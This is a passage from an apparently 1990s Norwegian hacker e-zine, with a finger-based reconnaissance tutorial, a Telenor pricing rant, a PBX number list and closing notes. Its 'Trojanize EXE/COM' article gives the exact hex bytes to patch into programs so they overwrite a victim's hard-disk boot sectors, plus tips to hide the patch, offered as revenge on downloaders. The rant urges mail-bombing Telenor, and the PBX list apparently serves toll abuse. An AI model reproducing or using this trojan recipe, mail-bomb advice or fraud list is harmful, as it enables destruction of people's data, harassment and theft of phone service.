to crack into non-public parts systems and get unauthorized axz!..
and one more time, AN shell makes it a helluva lot easier!. ;) ok here we go

you've entred the shell account now I suppose. do a

finger harry@nord.no

but replace harry@nord.no with the email to someone you want to check out
a bit .. now this may give you some stuff about the guy who owns the email
you entered or you may get a "access denied.", if you get access denied, then
you probably don't got the finger command on your shell (Norwegian note -
Som sagt, siden jeg kj›rer SN, kan dere som har sn nesten gj›re alt det
jeg gj›r!) but Don't sweat, I'll show you a more eleet way of fingering
some one.

do a

telnet hasle.sn.no 79

now, you'll enter the finger port on hasle. you can enter hasle with out a
password.. kewl?.. well you can just enter one command.. enter the command

mmiri

what you did was to finger my user account, it will give some stuff about
me, my login name, my email, if I have some unread email's etc. etc.
well do the same and try these names (Commands)

There no point in hacking/cracking hasle, cause there no cool stuff to get
there..

------------

root
system
bin
guest
test
deamon
demo
time
finger
@
0
ftp
manager
------------

*HEHE* root is the best access you could get! but none of these command's
       will give yah root access =/..

Remember the eleet of the ELLLLLLLLEEEETTTT, ppl, give the sysadim a
msg on how you cracked in to the system! and maybe say how to fix it.


there are SO many thing's you could try, but I won't list them all. those I
have listed, are the most used command's to crack in to systems.

Ok, so what have we learned?

what is finger? Finger is a program that runs on port 79 (That's why we
could telnet there!) on many inet hosts. it will provide information on
a given user, on a given system..

Well for a cracker there are lotsa other thing's to do after finger..
but I won't teach those felonies ;).. hehe


Have phun

                                                           Djnad / enterprise

                                    ,,,
_______________________________oOO_(o-o)_OOo_________________________________
Subject: Trojanize EXE/COM's       (_)      Written by: Deathwalker
-----------------------------------------------------------------------------


                          TROJANIZE EXE/COM FILES
                         -=-=-=-=-=-=-=-=-=-=-=-=-
                           Written by dEATHWALKEr

I bet that you don't like these fuckin assholes that downloads tons of warez,
and then they don't give shit back. Then, get the latest program or game
and fix some bytes, and then give the file to the sucker. Bwahahaha
what happened to his harddrive. (Hehehehehehe!) This is an easy way to make
exe files destructive. When the file is trojanized, it can be used to fuck
someone's computer up. Ok, it is very easy to do this. To do this we will
need a hexeditor(I use NORTON'S DISKEDIT), cause we will have to change
a few bytes in the file(Only 16 bytes). The best type of file to fix is a the
EXE files(or a big comfile) since the com file will allmost use it's code
all the time. Let's get started! Search for an occurence of "CD 21", the dos
interrupt. When found, then do this. Edit these bytes into the file:
(Starting from the CD 21)
    B4 03         ; * MOV AH,003H   (WRITE SECTORS)
    B0 C8         ; * MOV AL,0C8H   (NUMBER OF SECTORS)
    B5 00         ; * MOV CH,000H   (CYLINDER NUMBER)
    B1 01         ; * MOV CL,001H   (SECTOR NUMBER)
    B6 00         ; * MOV DH,000H   (HEAD NUMBER)
    B2 80         ; * MOV DL,080H   (DRIVE) 80=C:
    CD 13         ; * INT 013H      (DISK INTERRUPT)
    CD 20         ; * INT 020H      (TERMINATE THE PROGRAM)

!! DO NOT EXECUTE/RUN THIS PROGRAM AFTER YOU HAVE PATCHED IT !!
If you should start this program, then you can kiss you harddrive's boot
goodbye(Some harddrives can NOT be fixed after this program has been run).
"Some computers save their CMOS and BIOS information at the boot."

XTRA TIP(S):

 - Crypt the program after you have patched the file (PROT or EXEPROT or ??)
 - Compress the file(PKLITE or DIET or ????)

                                                -_- <] dEATHWALKEr [> -_-





                                    ,,,
_______________________________oOO_(o-o)_OOo_________________________________
                                    (_)

*NOTE* This last part is written in norwegian, since it is not of interest
of non-norwegians. Yeah, I know. Promise I'll stop writing articles in
norwegian. This will be the last! Okiz, well, c'ya

-----------------------------------------------------------------------------




                                    ,,,
_______________________________oOO_(o-o)_OOo_________________________________
Subject: Telenor Suger              (_)      Written by: Codeblaster
-----------------------------------------------------------------------------


                    __   ____ ______   ____    _____     __
                   _) ¬. )   \   __/__l___( __(____/ ___|  ¬.
                 _/·    Y·  \ \  / o· ___/ Yo· __/__(_  !  _/_
                ,\      .    \  /\    \/   .  '     .   _    /
              .p)h`--.__j----'\//.`---.____j---.____j---l____\

                     1.1 - Hva er denne artikkelen om?
                     1.2 - Noen fakta
                     1.3 - Telenors situasjon i dag (Pris›kningen)
                     1.4 - Hermansen f†r det som han vil (Kontaktene)
                     1.5 - Hva skjer n†r monopolet faller i 98?
                     1.6 - Telenors konkurrenter
                     1.7 - Hva kan DU gj›re?
                     1.8 - Konklusjon

1.1 - Hva er denne artikkelen om?
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Er du lei av † m†tte betale overpris for † ringe internett? Er du lei av
at Telenor, et statsfinansiert selskap, f›rst lover noe og s† gj›r det
stikk motsatte? Det er iallefall jeg, og det er faktisk noe man kan gj›re
med det... Jeg skal her si litt om Telemarkedet i Norge i dag, og litt
om fremtiden og hva vi kan gj›re for † bekjempe Telenors prispolitikk.


1.2 - Noen Fakta:
~~~~~~~~~~~~~~~~~
þ I 96 gikk Telenor ut i media (bla. p† TV2 nyhetene) og lovte oss GRATIS
  lokaltakst i 97. Men hva hendte i 97? Jo, de bestemte seg heller for †
  gj›re det stikk motsatte; De satt opp taktsten p† lokaltakst med hele
  83%! Og n† lover de oss gratis lokaltakst i 98, som om de i det hele tatt
  har noe troverdighet igjen...

þ Telefonmonopolet i Norge faller 1. Januar 1998. Telenor er etter dette
  ikke lenger de eneste som har lov til † drive med teletrafikk her i
  Norge. Det er p† tide det er slutt p† monopolet, ettersom de har hatt
  det helt siden 1880.

þ Alminnelig, innenlands telefoni utgj›r 43% av Telenors samlede inntekter.
  Telenor er livredd for † miste kunder (logisk - 43% er ganske mye), og
  det betyr at privatbrukerne (oss) har egentlig ganske stor makt - HVIS
  vi st†r samlet!

þ Tormod Hermansen (Telenor-sjef) har gode kontakter innenfor regjeringen,
  han har etablert et nettverk av bedrifter for † forberede Telenor p†
  konkurransen utenfra i 98 - dette kan gj›re ting meget vanskelig for
  selv de st›rste multinasjonale selskapene, for Telenor spiller p†
  hjemmebane og vi har sett endel ganger at Hermansen f†r det som han vil.


1.3 - Telenors situasjon i dag (Pris›kningen)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Telenor sitter egentlig i en ganske perfekt situasjon i dag. De har monopol,
og de vet hvordan de skal utnytte det; og SAMTIDIG f† folk til † tro at
de "Senker prisene drastisk" og bare tenker p† alles beste. "Vi senker
prisene med over 70%" heter det s† fint, men gj›r de egentlig det?

NEI! De har faktisk satt opp prisene, og tullingene som trodde Telenors
fagre l›fter i begynnelsen av 97 (Foreldrene dine kommer sikkert inn under
den katagorien) finner nok ut, at prisene faktisk har STEGET hvis de
sammenligner telefonregningen f›r og etter †rsskiftet. Mens de satt ned
fjerntakst prisen med 70% satt de sammtidig opp lokaltakst prisen med 80%!
Og de fleste merker nok heller de 80%'ene fordi de mye oftere ringer til
bekjente i sin egen kommune eller nabokommunene enn de ringer til folk langt
vekke.

Og dette merker iallefall vi internett brukere skikkelig. Fra † betale 4,6kr
f›r nytt†r m† vi n† betale 8,x per time. Dette virker kanskje ikke mye hver
time, men det blir endel n†r man kommer opp i antall timer. (Hvis feks.
regningen var p† 2000 gjennomsnittlig i 96, kan den godt bli n‘rmere 4000
i †r. OG DETTE SKJER ETTER DE LOVTE OSS *GRATIS* LOKALTAKST INNEN 1997!
At Telenor i det hele tatt kommer seg vekk med et slikt overtramp er helt
utrolig, men som sagt; Hermansen har mange kontakter etter sine †r innenfor
regjeringen.

Jeg kan jo ogs† legge til at i dag har Telenor praktisk talt ikke bare
monopol p† telefoni i norge, men ogs† p† internett oppkobling. Etter
fusjonen med SN har de n† 80% av markedet, og dette gj›r det vanskelig
for sm†bedrifter † ta opp kampen om prisene (Det er imidlertid noen som
gj›r en god innsats, les mer om dette under 'Hva kan du gj›re?')

Telenor har videre bygget ut et nettverk av investeringer innenfor 108
ulike selskaper i inn- og utland. De forbereder seg godt p† dagen monopolet
faller ved † opprette avtaler med store selskaper (feks. Statoil), invistere
her og der, og f†r godt med penger av staten. Feks. har de aksjer i Elkj›p,
s† hvis du kj›per noe der, g†r 10% til Telenor (Moral: boikott Elkj›p!)

Sp›rsm†let er; HVOR har de f†tt pengene til † invistere i alle slags
forskjellige selskapet, og skape seg dette nettverket? ... Jo, det f†r
du vite mer om her;

1.4 - Hermansen f†r det som han vil (Kontaktene)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Som statsselskap har Telenor en generalforsamling som best†r av en enkelt-
person; Samferdselsministeren. Denne generalforsamlingen er som kjent
Kjell Opseth og Sissel R›nbeck; Hermansens partifeller! (Skulle ikke forundre
meg om disse ogs† var personlige venner), for † illustrere dette litt
enklere i ascii, blir kommandolinjene slik: (›verst har mest makt.)

                               ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
                               ³ Samferdsels-    ³
                               ³ departamentet   ³
                           ÚÄÄÄ´                 ÃÄÄÄÄÄ¿
                           ³   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ     ³
                           ³                           ³
                           ³                           ³
                           ³                           ³
                           ³   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿     ³
                           ³   ³ Statens         ³     ³
                           ³   ³ Teleforvalting  ³<ÄÄÄÄÙ
   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿     ³   ³                 ³
   ³ TELENOR         ³<ÄÄÄÄÙ   ÀÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ³ m/Hermansen     ³<ÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ³                 ³
   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

Vi ser her to ulike som kan gi Telenor "ordrer" eller p†legg, Samferdsels-
departamentet og Statens Teleforvalting. Samferdselsdepartamentet st†r
igjen over Statens Teleforvalting, og kan sette til side deres p†legg.
Og da, er jo Samferdselsdepartamentet de eneste Telenor trenger † forholde
seg til, og de har jo Hermansen i sin hule h†nd. Et eksempel p† Hermansens
kontakter der, og at Statens Teleforvalting er "under" Samferdsels-
departamentet finner vi i Teletopia saken: (BT 02.04.97)

"I to †r har det vesle nisjefirmaet Teletopia AS kjempet for † konkurrere
 med Telenors datterselskaper, blant annet innen teletorg-tjenester.
 Statens Teleforvalting p†la Telenor † gi Teletopia telelinje p† samme
 vilk†r som Telenors egne bedrifter. Telenor klaget til Samferdsels-
 departamentet. Dagen etter ble teleforvaltingens p†legg satt til side.
 (...) verste ankeinstans i telesaker er alts† Telenors eier og general-
 forsamling."

Videre i BT/Stavanger Aftenblad/Adresseavisen samme dag;

"Men det finnes gode eksempler p† at n†r Tormod Hermansen har f†tt en
 overbevisning om hva som er rett, s† blir det etter hvert ogs† Ap-
 regjeringens offisielle politikk."

Er dette det man kaller en korrupt regjering eller hva?

Et annet eksempel p† at Hermansen f†r det som man vil finner man i 1996,
n†r han fant ut at Telenor trengte litt mer penger for † lage nettverket
sitt (som jeg skrev litt om tideligere). Samferdselsdepartamentet foreslo
da at 2 milliarder av Telenors statsgjeld skulle omgj›res til Egen-
kapital (dvs. de fikk 2 milliarder av staten). Hvorfor skal egentlig
Stortinget bruke skattebetalernes penger p† noe slikt?

Og hva vil konkurransemyndighetene (EFTA) og ES-organene mene om et
marked der den helt dominerende av konkurrentene kan f† innspr›ytinger
fra statskassen? Jeg skal v‘re den f›rste som anmelder dette tilfellet
enten til ES-organene el. EFTA hvis noe slikt skjer i 98.

Kort sagt; Hermansen har kontakter s† det holder, og det kan bli vanskelig,
selv for de skikkelig store multinasjonale selskapene † komme inn p† det
norske markedet. Vi som privatbrukere kan imidlertid gj›re noe med dette
(les videre..)


1.5 - Hva skjer n†r monopolet faller i 98?
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Ingen vet hva som vil komme til † skje her i norge etter monopolets fall
1. januar 1998. En ting er sikkert; utenlandske (og kanskje norske) selskaper
vil pr›ve seg, iallefall p† bedriftsmarkedet. Men det som teller for oss,
er om vi vil f† stor konkurranse p† privatbrukermarkedet. Det er det som
bestemmer om vi f†r gratis lokaltakst eller ikke.

Slik funker det i 98:
Konkurrentene har 2 muligheter til † tilby oss privatbrukere tele-tjenester
p†;
                1) Sette opp nye linjer
                2) Leie linjer av Telenor

F›rste mulighet er omtrent utelukket, ettersom de da m† legge nye linjer
inn til hver eneste husstand, og det vil bli *DYRT*. S† deres eneste mulighet
blir da † LEIE linjene til Telenor. Staten skal sette en maxpris som Telenor
kan ta i leie, men noe sier meg at denne kan bli HY (Det har jo vist seg
tideligere at Hermansen f†r det som han vil...)

Hvordan ser da mulighetene ut for v†re privatbrukere; JO - VELDIG DRLIGE!
Selskaper t›r kanskje ikke pr›ve seg p† privatbruker markedet hvis Telenor
tar HY leie, og da blir det ikke noe bedre for oss i det hele tatt. Hvis
vi ser p† England for eksempel; Der falt telemonopolet for 10 †r siden,
likevel har British Telecom fremdeles 90% av markedet! - Og det er godt
mulig det samme skjer her i Norge; Telenor beholder markedet, og vi f†r
null konkurranse p† privatbrukermarkedet, og dermed; Telenor har fremdeles
makten!

Som sagt; Telenor vil ogs† i fremtiden eie linjene her i norge, s† hvis
du velger en annen operat›r enn Telenor, m† du sannsynligvis betale linje-
leie til Telenor, og dette kan igjen medf›re at det blir dyrere † velge
en av konkurrentene. Telenor har helt klart et godt kort p† h†nden der.

Det ser ikke lyst ut, men fortvil ikke, det er fremdeles h†p :) for Telenor
kan f† konkurranse:

1.6 - Telenors konkurrenter
~~~~~~~~~~~~~~~~~~~~~~~~~~~
Det finnes 3 internasjonale giganter (og Telenor er som en microcar i forhold
til en lastebil mot disse):

 Concert - British Telecom
 ~~~~~~~   Amerikanske MCI
           (Telenor er med i denne)

 Global One - Amerikanske SPRINT
 ~~~~~~~~~~   Deutsche Telecom
              France Telecom

 World Partners
 ~~~~~~~~~~~~~~

Alle disse 3 vil trolig pr›ve seg p† markedet i norge. Men de vil f›rst
og fremst satse p† bedriftmarkedet; og forutsetningen for at de skal
pr›ve seg p† privatbrukermarkedet er nettopp; om leien for Telenors linjer
blir lav nok...

Videre vil Telia (Det svenske teleselskapet) trolig bli den bitreste
konkurrenten til Telenor, og Telia vil f†rh†pentligvis ogs† pr›ve seg
p† privatbrukermarkedet her i Norge. Selvf›lgelig p† samme forutsetning
som de andre har. (Ingen kan pr›ve seg hvis leieprisen p† linjene blir
urimelig h›y)

Tele2 kan ogs† nevnes, det er mulig de har tenkt † satse p† privatkunder,
hvis vilk†rene blir gode nok (som i de andre tilfellene)

Forsvarets kommunikasjonsnett kunne ogs† v‘rt brukt til telenett, men
staten valgte † utelukke denne muligheten. S† der har man ingen ting
† hente.

En konkurrent som kanskje ikke s† mange hadde forventet, kan faktisk bli
kraftverkene i norge! De har allerede telenettverk som de bruker i kontroll,
overv†king og styring av sine anlegg. Og de kan ogs† bygge ut fiberoptisk
telenett p† str›mkablene sine som allerede g†r til alle husstander over
hele landet. (Fiberoptisk = RASK internett oppkobling :)) Og en ny teknologi
som gj›r det mulig † spinne fiberoptiske kabler rundt h›yspentlinjene,
gj›r at kraftselskapene faktisk kan sette opp et slikt nett langt billigere
enn Telenor som m† grave ned kablene. S†, konklusjonen her m† v‘re at
kraftselskapene faktisk kan bli en meget interessant konkurrent til Telenor.
(EniTel AS og El-Tele AS er 2 giganter her)

Vi kan h†pe p† at det blir mange om kj›ttbeinet etter 98, for dess mer
konkurranse dess bedre blir det for oss...


1.7 - Hva kan DU gj›re?
~~~~~~~~~~~~~~~~~~~~~~~
Som jeg nevnte tideligere s† utgj›r vi (vanlig telefoni) 43% av Telenors
totale inntekter, og dette er mye. Samlet er vi sterke, mens en og en er
vi ingenting. S†, for at du skal utrette noe, kan det v‘re en ide † komme
i kontakt med andre, som fex. † melde deg inn i IBIO (Internettbrukernes
interesseorganisasjon), denne finner du p†:

                        http://www.ibio.no/

Abbonomentet koster imidlertid 100kr :(, men det g†r jo til et godt form†l.
IBIO er en seri›s organisasjon, og de jobber stadig med † bedre internett-
brukernes k†r. De har alltid en advokat som plager Telenor ;)

Du kan ogs† ta en tur innom 'Si Nei Aksjonen' p†

                http://www.sysedata.no/si-nei-aksjonen/

og Teleslakt (mer useri›s) p† http://www.netpower.no/~eivind/teleslakt/

Det finnes ogs† andre ting du kan gj›re:
----------------------------------------
- Du kan sende emails til telenor, og fortelle dem hva du syntes om
  'pris-senkingen' deres, og n†r du f›rst er i gang kan du godt sende emailen
  med et program som 'UpYours!' eller 'Unabomber' slik at de f†r et par 100
  kopier av beskjeden din ;) (Stikk innom www.telenor.no for adresser)

- Skrive innlegg i avisene om Telenor (feks. leserinnlegg), feks. om den
  sannhet at de LOVTE gratis lokaltakst i 1997, mens de i realiteten satt
  opp prisen med 80% - jeg tror ikke dette faktum har v‘rt noe s‘rlig oppe
  i media.

- Ytre meningen din om Telenor uansett hvor du er, feks. p† kanaler p† IRC,
  og andre steder du f†r sjansen.

- Maile folk p† home.sol.no og www.sol.no (de som bruker Telenor frivillig)
  seri›se mails som forklarer Telenors 'loving og lyging' og evt. vise
  til tilbud hvor de ville f† billigere internet oppkobling, og gi dem
  http adresser til sider som tar seg av emnet (feks. IBIO's side).
  Stikk innom home.sol.no og www.sol.no og list alle userne, feks hvis
  et directory heter;

     /kjetola/

  s† vil adressen hans antageligvis v‘re kjetolaX0B1.8 - Konklusjon

~~~~~~~~~~~~~~~~
Konklusjonen m† v‘re at Telenor p† v†r bekostning pr›ver † tyne de siste
kronene ut av telemonopolet f›r det oppheves i 98. S†, n†r vi kommer til
98 - v‘r n›kterne i valg av operat›r, og husk hva Telenor gjorde og
sansynligvis ogs† kommer til † gj›re; Velg en av de andre leverand›rene
da, slik at vi f†r konkurranse p† markedet, og dermed billigere priser.

                                                            Codeblaster/TBH
                                    ,,,
_______________________________oOO_(o-o)_OOo_________________________________
Subject: PBX List! Free! Wow!       (_)      Written by: Ripperjack
-----------------------------------------------------------------------------


HORDALAND'S OFFICIAL PBX LIST!

Alrek Studenthjem                            - 55291802
Arbeidskontoret i Arna                       - 55243890
Arbeidskontoret i Fyllingsdalen              - 55168910
Arbeidskontoret p† Nesttun                   - 55135330
Arbeidskontoret p† Os›yro                    - 56304695
Bergen Airport Hotel                         - 55229236
Bergen Tekniske Fagskole                     - 55232582
Betanien Hospitalet                          - 55166979 - fax!
Datainstrument A/S                           - 55314390 - etter stengetid??
Den Norske Bank                              - 56302071
Inter Revisjon Bergen                        - 55295201
Jebsens Management A/S                       - 55310606
Knappentunet                                 - 55124299
Norsk Blikkvalseverk A/S                     - 55341260
Olaviken Behandlingssenter                   - 56149798
Os Likningskontor og Folkeregister           - 56301299
*Statens Dykkerskole                         - 55268904
Statens H›gskole for kunsth†ndverk og design - 55311943
Steen-Hansen F Malings- og Lakkfabrikk A/S   - 55100040
Stolz R›thing AS                             - 55345560
Vestlandet Kompetansesenter                  - 55296485
Bj›rketeigen                                 - 56555710
Norheimsund Yrkesskule                       - 56551530
Toloheimen                                   - 56552030
Arbeidskontoret i Knarvik                    - 56352330
Odda Plast AS                                - 53644480
Solid Vedlikehold AS                         - 56334275

To find out just how much it costs you to call these pbxs, dial 80031031 for
Telenor's price information service.

                                                              Ripperjack/TBH


                                    ,,,
_______________________________oOO_(o-o)_OOo_________________________________
Subject: Ending Notes               (_)      Written by: Codeblaster
-----------------------------------------------------------------------------

.......................................
:                                      : This mag was created by TBH! It'll be
:         BLACK HACKER MAGAZINE!       : the last release under the name TBH,
:       ____ _________ ______          : since we're now changing the groups
:    __/   /_\_      /_\_ _  \______   : name to NS! (No Shit!).
:    /     _  /_   _    /_ \    _  /_  :
:   /____  /   /___/     /__\  /    /  : Hope you enjoyed the mag!
:   mSO/______/__/______/____\/    /   :
:                            /____/    :
:                                      : E-Mail   :   blackhackers@hotmail.com
:                                      : Homepage :   www.ge3k.com
:......................................:


